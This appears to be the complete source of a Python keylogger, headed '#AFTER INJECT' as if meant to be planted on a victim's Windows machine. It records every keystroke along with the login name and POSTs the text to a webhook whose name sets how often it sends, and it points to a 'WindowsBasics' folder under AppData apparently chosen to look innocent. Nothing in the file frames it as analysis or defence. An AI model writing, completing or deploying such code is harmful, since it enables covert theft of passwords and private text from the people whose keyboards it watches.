#AFTER INJECT
import keyboard, requests, os
user = os.getlogin()
webhook = ""
def get_webhook_name(webhook_url):
    try:
        response = requests.get(webhook_url)
        webhook_name = response.json()["name"]
        return webhook_name
    except Exception as e:
        print(f"Error retrieving webhook name: {e}")
        return None
i = 0
message = ""
Windows_basic = f"C:/Users/{user}/AppData/Roaming/WindowsBasics/"
blacklist = ["backspace", "shift", "tab", "ctrl", "alt", "right ctrl", "alt gr", "menu", "up", "down", "right", "left", "caps lock"]
def on_key_press(event):
    global i, webhook, ammount, message
    if event.name == "space":
        message += f" "
        i += 1
    elif event.name in blacklist:
        message += f" ({event.name}) "
        i += 1
    else:
        message += event.name
        i += 1
    webhook_name = get_webhook_name(webhook)
    ammount = int(webhook_name)
    if i >= ammount:
        payload = {'content': user + ": " + message}
        requests.post(webhook, json=payload)
        i = 0
        message = ""
keyboard.on_press(on_key_press)
keyboard.wait()